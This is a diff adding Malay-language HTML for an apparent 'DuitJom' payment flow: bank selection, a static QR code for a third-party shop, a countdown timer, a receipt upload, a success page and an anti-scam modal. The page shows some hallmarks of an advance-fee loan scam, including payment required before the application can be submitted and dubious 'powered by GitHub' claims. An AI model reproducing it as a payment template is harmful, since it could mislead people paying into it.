@@ -458,4 +458,217 @@
             <div class="space-y-4 mb-8">
                 <div>
                     <label class="block text-xs font-bold text-slate-700 mb-1.5">Saluran</label>
-                    <select disabled class="w-full bg-white border border-gray-200 px-
+                    <select disabled class="w-full bg-white border border-gray-200 px-4 py-3 rounded-xl text-xs font-semibold text-slate-900 appearance-none">
+                        <option>DuitNow</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1.5">Bank *</label>
+                    <div class="relative">
+                        <select id="selectBank" onchange="checkBankSelection()" class="w-full bg-white border border-gray-300 px-4 py-3 rounded-xl text-xs font-semibold text-slate-900 appearance-none">
+                            <option value="" disabled selected>-- SILA PILIH BANK --</option>
+                            <option value="TNG">1- TOUCH'N GO</option>
+                            <option value="MAYBANK">2- MAYBANK QRPAY</option>
+                            <option value="DUITNOW_QR">3- DUITNOW QR/e-WALLET PAYMENT</option>
+                            <option value="RHB">4- RHB QRPAY</option>
+                            <option value="GRABPAY">5- GRABPAY</option>
+                            <option value="BOOST">6- BOOST</option>
+                        </select>
+                        <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-500 text-xs">
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="flex gap-3 pt-4 border-t border-gray-100">
+                <button onclick="backToStep2Page()" class="flex-1 bg-white border border-gray-200 text-slate-700 font-bold py-3.5 rounded-xl text-xs text-center shadow-xs cursor-pointer hover:bg-gray-50 transition">Kembali</button>
+                <button id="btnFinalNext" onclick="goToQRPage()" disabled class="flex-1 bg-gray-400 text-white font-bold py-3.5 rounded-xl text-xs text-center shadow-xs cursor-not-allowed transition">Teruskan</button>
+            </div>
+        </main>
+    </div>
+
+    <!-- QR PAGE -->
+    <div id="qrPage" class="hidden flex-col min-h-screen bg-gray-50 -mt-[72px] pt-[72px]">
+        <div class="max-w-md w-full mx-auto bg-white min-h-[calc(100vh-72px)] flex flex-col shadow-lg border-x border-gray-100">
+            <div class="flex justify-between items-center px-6 py-4 border-b border-gray-100 text-[11px] font-bold text-gray-500 tracking-wider">
+                <div class="flex items-center gap-1.5">
+                    <span class="w-2 h-2 rounded-full bg-blue-400"></span> AUTHORIZATION
+                </div>
+                <div class="flex items-center gap-1.5 text-gray-300">
+                    <span class="w-2 h-2 rounded-full bg-gray-300"></span> RESULT
+                </div>
+            </div>
+            <div class="px-6 py-4 grid grid-cols-2 gap-4 text-center border-b border-dashed border-gray-200 bg-white">
+                <div>
+                    <p class="text-[10px] text-gray-400 font-bold uppercase tracking-tight">Reference No.</p>
+                    <p class="text-xs font-extrabold text-slate-800">FXD_13121199</p>
+                </div>
+                <div>
+                    <p class="text-[10px] text-gray-400 font-bold uppercase tracking-tight">DJ/CUST NUMBER</p>
+                    <p id="qrLoanID" class="text-xs font-extrabold text-slate-800">-</p>
+                </div>
+            </div>
+            <div class="p-6 flex-grow flex flex-col items-center justify-start text-center">
+                <div id="qrBankBadge" class="mb-3 bg-blue-400 text-white text-xs font-black px-4 py-2 rounded-lg shadow-xs tracking-wide">
+                    Touch 'n Go eWallet
+                </div>
+                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-wide">Please Pay</p>
+                <h1 class="text-2xl font-black text-slate-900 mt-0.5 mb-4">
+                    <span id="qrMainAmaun">RM 0.00</span> <span class="text-xs font-normal text-gray-400">ONLY</span>
+                </h1>
+                <div class="w-64 p-4 border-[12px] border-blue-400 rounded-3xl bg-white shadow-md flex flex-col items-center justify-center relative">
+                    <img src="F534F3AA-ACF5-40DB-BEF0-7300EC9FA735.jpeg" alt="QR Code" class="w-full h-auto object-contain rounded-lg" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=DuitJom'">
+                    <p class="text-[8px] font-bold text-red-400 mt-3 tracking-tighter">ONE TIME USE, VALID TILL 2026-06-02</p>
+                    <h2 class="text-sm font-black text-slate-900 mt-2 tracking-tight leading-tight">
+                        SHAFIQ SHOP (M) ENTERPRISE
+                    </h2>
+                    <div class="mt-4 bg-green-50 border border-gray-400 rounded-xl px-4 py-2 w-full">
+                        <p class="text-[10px] font-bold text-red-400 uppercase tracking-wider">Time Remaining</p>
+                        <p id="countdownTimer" class="text-sm font-semibold text-red-800">1m 59s</p>
+                    </div>
+                </div>
+                <p class="text-[11px] text-gray-500 font-semibold mt-4 max-w-xs leading-relaxed px-2">
+                    Scan the QR code and complete the payment. <br>This payment valid for <span class="text-blue-400 font-bold">ONE TIME</span> use only.
+                </p>
+                <div class="w-full max-w-sm mt-6 border-t border-dashed border-gray-200 pt-6 text-left">
+                    <label class="block text-xs font-black text-slate-800 mb-2">
+                        <i class="fas fa-cloud-upload-alt text-blue-400 mr-1"></i> Muat Naik Resit Pembayaran *
+                    </label>
+                    <div class="relative bg-white border-2 border-dashed border-blue-300 rounded-xl p-4 text-center hover:bg-blue-50/50 transition cursor-pointer">
+                        <input type="file" id="receiptUpload" accept="image/*,application/pdf" onchange="handleFileSelected()" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10">
+                        <div id="uploadPlaceholder" class="space-y-1">
+                            <i class="fas fa-images text-2xl text-blue-300"></i>
+                            <p class="text-xs font-bold text-gray-600">Klik untuk muat-naik resit/bukti pembayaran</p>
+                            <p class="text-[10px] text-gray-400">Format: PNG, JPG, PDF sehingga 5MB</p>
+                        </div>
+                        <div id="uploadSuccess" class="hidden space-y-1 text-emerald-600">
+                            <i class="fas fa-check-circle text-2xl"></i>
+                            <p class="text-xs font-bold" id="fileNameDisplay">Resit berjaya dimuat naik!</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="p-4 bg-white border-t border-gray-100 flex gap-3">
+                <button onclick="backToStep3Page()" class="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-xl text-xs text-center transition cursor-pointer">
+                    Sebelum
+                </button>
+                <button id="btnSubmitForm" onclick="finalSubmission()" disabled class="flex-1 bg-gray-400 text-white font-bold py-3.5 rounded-xl text-xs text-center shadow-md cursor-not-allowed transition">
+                    Hantar Permohonan
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- THANKS PAGE -->
+    <div id="thanksPage" class="hidden flex-col min-h-screen bg-white justify-between -mt-[72px] pt-[72px]">
+        <main class="max-w-md w-full mx-auto px-6 py-12 flex-grow flex flex-col items-center justify-center text-center">
+            <div class="w-20 h-20 bg-emerald-50 rounded-full flex items-center justify-center text-emerald-500 text-4xl mb-6 shadow-xs">
+                <i class="fas fa-check-circle animate-pulse"></i>
+            </div>
+            <h1 class="text-2xl font-black text-slate-900 tracking-tight mb-2">
+                Pembayaran Berjaya
+            </h1>
+            <div class="inline-block bg-blue-50 border border-blue-200 text-blue-600 font-bold text-xs px-4 py-2 rounded-xl mb-8">
+                <i class="fas fa-clock mr-1"></i> Sila tunggu! - Transaksi anda sedang diproses.
+            </div>
+            <div class="bg-gray-50 border border-gray-100 rounded-2xl p-6 shadow-xs max-w-sm w-full">
+                <p id="thanksMessage" class="text-sm text-gray-700 leading-relaxed font-medium">
+                    -
+                </p>
+            </div>
+            <div class="w-full max-w-xs mt-10">
+                <button onclick="window.location.reload()" class="w-full bg-slate-900 hover:bg-slate-950 text-white font-bold text-xs py-3.5 rounded-xl shadow-md transition cursor-pointer">
+                    Kembali Ke Log Masuk
+                </button>
+            </div>
+        </main>
+        <footer class="bg-gray-50 text-gray-400 py-4 text-[10px] text-center border-t border-gray-100">
+            <p>&copy; 2026 DuitJom. Transaksi Selamat & Pantas dikuasakan GitHub,Razorpay Curlec .</p>
+            <p class="mt-2 flex flex-wrap justify-center gap-2 px-4">
+                <a href="privacy-policy.html" class="hover:text-gray-600 transition">Polisi Privasi</a> |
+                <a href="terms.html" class="hover:text-gray-600 transition">Terma & Syarat(FAQ)</a> |
+                <a href="data-deletion.html" class="hover:text-gray-600 transition">Data Pengguna</a>
+            </p>
+        </footer>
+    </div>
+
+    <!-- SCAMMER MODAL -->
+    <div id="scammerModal" class="fixed inset-0 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 hidden z-50">
+        <div class="bg-[#F5F5F5] rounded-3xl max-w-md w-full shadow-2xl overflow-hidden flex flex-col border border-gray-200">
+            <div class="bg-blue-500 text-white text-center py-4 font-extrabold text-sm uppercase tracking-wider">
+                PERHATIAN⁉️
+            </div>
+            <div class="p-5 space-y-4 max-h-[65vh] overflow-y-auto no-scrollbar text-xs">
+                <div class="bg-white rounded-2xl p-4 border-l-4 border-[#2E7D32] shadow-xs">
+                    <div class="flex items-center gap-2 mb-2">
+                        <i class="fas fa-check-circle text-[#2E7D32] text-sm"></i>
+                        <p class="font-extrabold text-[#2E7D32] text-sm">Website Untuk Memohon</p>
+                    </div>
+                    <p class="text-gray-600 font-medium mb-3">Kami hanya <span class="font-bold text-gray-900">jalankan</span> laman web rasmi:</p>
+                    <a href="https://www.duitjom.com/" target="_blank" class="inline-flex items-center gap-2 bg-[#E8F5E9] text-[#2E7D32] font-bold px-4 py-2 rounded-xl border border-[#C8E6C9] hover:bg-[#C8E6C9] transition">
+                        <i class="fas fa-globe"></i> www.duitjom.com
+                    </a>
+                </div>
+                <div class="bg-white rounded-2xl p-4 border-l-4 border-blue-400 shadow-xs">
+                    <div class="flex items-center gap-2 mb-3">
+                        <i class="fas fa-wallet text-blue-400 text-sm"></i>
+                        <p class="font-extrabold text-blue-400 text-sm">Cara Pembayaran Yang Sah</p>
+                    </div>
+                    <ul class="space-y-2 text-gray-600 font-medium list-none pl-0">
+                        <li class="flex items-start gap-2">
+                            <span class="text-blue-400 mt-0.5">•</span>
+                            <span>Login menggunakan Google atau akaun anda sendiri di laman web rasmi untuk mendapatkan <span class="font-bold text-gray-900">QR DuitNow Pembayaran</span>.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-blue-400 mt-0.5">•</span>
+                            <span><span class="font-bold text-gray-900">Tiada</span> bayaran melalui email, Facebook, WhatsApp atau pihak ketiga.</span>
+                        </li>
+                    </ul>
+                    <div class="mt-4 bg-blue-50 text-blue-600 font-black text-center py-2.5 rounded-xl border border-blue-200 uppercase tracking-wide">
+                        Selain dari ini adalah PENIPUAN.
+                    </div>
+                </div>
+                <div class="bg-white rounded-2xl p-4 border-l-4 border-[#EF6C00] shadow-xs">
+                    <div class="flex items-center gap-2 mb-3">
+                        <i class="fas fa-exclamation-triangle text-[#EF6C00] text-sm"></i>
+                        <p class="font-extrabold text-[#EF6C00] text-sm">Taktik Scammer</p>
+                    </div>
+                    <ul class="space-y-2.5 text-gray-600 font-medium list-none pl-0">
+                        <li class="flex items-start gap-2">
+                            <span class="text-blue-400 mt-0.5">•</span>
+                            <span>Scammer akan menghantar <span class="font-bold text-gray-900">screenshot QR Kod palsu</span> melalui WhatsApp.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-blue-400 mt-0.5">•</span>
+                            <span>Sila <span class="font-bold text-gray-900">abaikan</span> dan jangan klik pautan yang dihantar oleh pihak luar.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-blue-400 mt-0.5">•</span>
+                            <span>Sentiasa login akaun sendiri dan bayar melalui laman web rasmi atau bersama ejen rasmi sahaja.</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="p-4 bg-white border-t border-gray-100 flex justify-center">
+                <button onclick="closeScammerModal()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-xl text-xs shadow-md flex items-center justify-center gap-2 transition">
+                    <i class="fas fa-check-circle"></i> Saya Faham
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- IMPORTANT: Panggil fail JavaScript luaran di bahagian paling bawah -->
+    <script src="script.js"></script>
+
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script>
+        window.__lc = window.__lc || {};
+        window.__lc.license = 19872149;
+        window.__lc.integration_name = "manual_channels";
+        window.__lc.product_name = "livechat";
+        ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+    </script>
+    <noscript><a href="https://www.livechat.com/chat-with/19872149/" rel="nofollow">hubungi kami</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">Duitjom x GitHub, Razorpay Curlec</a></noscript>
+    <!-- End of LiveChat code -->
+</body>
+</html>
